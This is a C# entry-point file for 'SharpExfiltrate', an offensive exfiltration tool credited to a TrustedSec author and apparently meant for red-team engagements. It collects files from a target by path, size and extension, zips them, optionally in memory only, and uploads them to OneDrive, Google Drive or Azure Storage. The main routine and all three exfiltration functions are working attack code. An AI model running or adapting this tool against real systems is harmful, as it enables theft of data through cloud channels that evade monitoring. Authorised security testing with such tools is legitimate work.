using CommandLine;
using SharpExfiltrate.Models;
using SharpExfiltrate.Modules;
using System;
using System.Threading.Tasks;

namespace SharpExfiltrate
{
    public class Program
    {
        public static void ShowBanner()
        {
            Console.WriteLine(@"
  __  _  _  __  ___ ___ _____   _____ _ _ _____ ___  __ _____ ___  
/' _/| || |/  \| _ \ _,\ __\ \_/ / __| | |_   _| _ \/  \_   _| __| 
`._`.| >< | /\ | v / v_/ _| > , <| _|| | |_| | | v / /\ || | | _|  
|___/|_||_|_||_|_|_\_| |___/_/ \_\_| |_|___|_| |_|_\_||_||_| |___| 
@Flangvik - TrustedSec
                ");

        }

        public static async Task<int> GoogleDriveExfil(GoogleDriveOptions googleDriveOptions)
        {
            var fileHandlingModule = new FileHandling(googleDriveOptions.FilePath, googleDriveOptions.FileSize, googleDriveOptions.FileExtensions, googleDriveOptions.MemoryOnly);

            var oneDriveModule = new GoogleDrive(googleDriveOptions);

            var zipFileData = fileHandlingModule.PrepareZipFile();

            if (zipFileData.entryCount == 0)
            {
                Console.WriteLine("[+] No files compressed, check your size and extension filter!");
                return 0;
            }

            await oneDriveModule.UploadFile(zipFileData.zipStream, zipFileData.newFileName);

            return 0;

        }


        public static async Task<int> AzureStorageExfil(AzureStorageOptions azureStorageOptions)
        {
            var fileHandlingModule = new FileHandling(azureStorageOptions.FilePath, azureStorageOptions.FileSize, azureStorageOptions.FileExtensions, azureStorageOptions.MemoryOnly);

            var azureStorageModule = new AzureStorage(azureStorageOptions.ConnectionString);

            var zipFileData = fileHandlingModule.PrepareZipFile();

            if (zipFileData.entryCount == 0)
            {
                Console.WriteLine("[+] No files compressed, check your size and extension filter!");
                return 0;
            }

            await azureStorageModule.UploadFile(zipFileData.zipStream, zipFileData.newFileName);

            return 0;

        }

        public static async Task<int> OneDriveExfil(OneDriveOptions oneDriveOptions)
        {

            var fileHandlingModule = new FileHandling(oneDriveOptions.FilePath, oneDriveOptions.FileSize, oneDriveOptions.FileExtensions, oneDriveOptions.MemoryOnly);

            var oneDriveModule = new OneDrive(oneDriveOptions);

            var zipFileData = fileHandlingModule.PrepareZipFile();

            if (zipFileData.entryCount == 0) {
                Console.WriteLine("[+] No files compressed, check your size and extension filter!");
                return 0;
            }

            await oneDriveModule.UploadFile(zipFileData.zipStream, zipFileData.newFileName);

            return 0;
        }

        public static void Main(string[] args)
        {

            ShowBanner();
            CommandLine.Parser.Default.ParseArguments<OneDriveOptions, GoogleDriveOptions, AzureStorageOptions>(args)
              .MapResult(
                
                (OneDriveOptions opts) => OneDriveExfil(opts).GetAwaiter().GetResult(),
              //  (DropBoxOptions opts) => DropBoxExfil(opts).GetAwaiter().GetResult(),
                (GoogleDriveOptions opts) => GoogleDriveExfil(opts).GetAwaiter().GetResult(),
                (AzureStorageOptions opts) => AzureStorageExfil(opts).GetAwaiter().GetResult(),
                errs => 1);
        }
    }
}
